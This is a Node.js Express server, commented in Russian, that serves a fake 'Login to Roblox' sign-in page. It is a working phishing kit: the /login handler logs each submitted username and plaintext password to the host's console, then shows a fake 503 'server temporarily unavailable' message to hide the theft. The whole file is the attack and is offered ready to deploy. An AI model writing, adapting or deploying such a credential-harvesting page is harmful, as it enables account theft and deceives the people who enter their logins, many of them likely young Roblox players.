const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Настройка сервера для чтения текстовых данных из HTML-формы
app.use(express.urlencoded({ extended: true }));

// Маршрут для отображения главной страницы с формой входа
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            
            /* https://postimg.cc/R6MCLQWg */
            background: url('https://postimg.cc') no-repeat center center fixed;
            background-size: cover;
            
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .auth-container { 
            background-color: #2b2d32; 
            padding: 30px; 
            border-radius: 8px; 
            width: 100%;
            max-width: 380px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            box-sizing: border-box;
        }
        .input-control { 
            width: 100%; 
            padding: 12px; 
            margin-bottom: 15px; 
            background-color: #383b40; 
            border: 1px solid #4a4e54; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 15px; 
            box-sizing: border-box; 
        }
        .input-control::placeholder { color: #a0a5ab; }
        .input-control:focus { outline: none; border-color: #ffffff; }
        
        .btn-submit { 
            width: 100%; 
            padding: 12px; 
            background-color: transparent; 
            border: 1px solid #ffffff; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 16px; 
            font-weight: 500; 
            cursor: pointer; 
            margin-bottom: 20px; 
            transition: background-color 0.2s; 
        }
        .btn-submit:hover { background-color: rgba(255, 255, 255, 0.1); }
        
        .secondary-actions { border-top: 1px solid #3f434a; padding-top: 20px; margin-top: 20px; }
        .btn-secondary { width: 100%; padding: 12px; background-color: #383b40; border: none; border-radius: 6px; color: #ffffff; font-size: 15px; cursor: pointer; margin-bottom: 10px; text-align: center; box-sizing: border-box; }
        .btn-secondary:hover { background-color: #43474d; }
        
        .link-text { display: block; text-align: center; color: #ffffff; font-size: 14px; text-decoration: none; margin: 15px 0; }
        .link-text:hover { text-decoration: underline; }
    </style>
</head>
<body>
<div class="auth-container">
    <h2 style="color: #ffffff; text-align: center; margin-top: 0; margin-bottom: 25px; font-size: 24px; font-weight: 600;">
        Login to Roblox
    </h2>
    <form action="/login" method="POST">
        <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
        <input type="password" name="password" class="input-control" placeholder="Password" required>
        <button type="submit" class="btn-submit">Log In</button>
    </form>
    <a href="#" class="link-text">Forgot Password or Username?</a>
    <div class="secondary-actions">
        <div class="btn-secondary">Email Me a One-Time Code</div>
        <div class="btn-secondary">Quick Sign-in</div>
    </div>
    <a href="#" class="link-text" style="margin-top: 20px;">Don't have an account? Sign Up</a>
</div>
</body>
</html>
    `);
});

// Обработчик POST-запроса (сюда приходят данные из формы)
app.post('/login', (req, res) => {
    // Вывод полученных данных в панель Logs на хостинге
    console.log(`[СЕРВЕР] Данные получены! Логин: ${req.body.username}, Пароль: ${req.body.password}`);
    
    // Ответ пользователю в браузере после нажатия кнопки
    res.status(503).send('Сервер временно недоступен.');
});

// Запуск прослушивания порта
app.listen(PORT, () => {
    console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
});
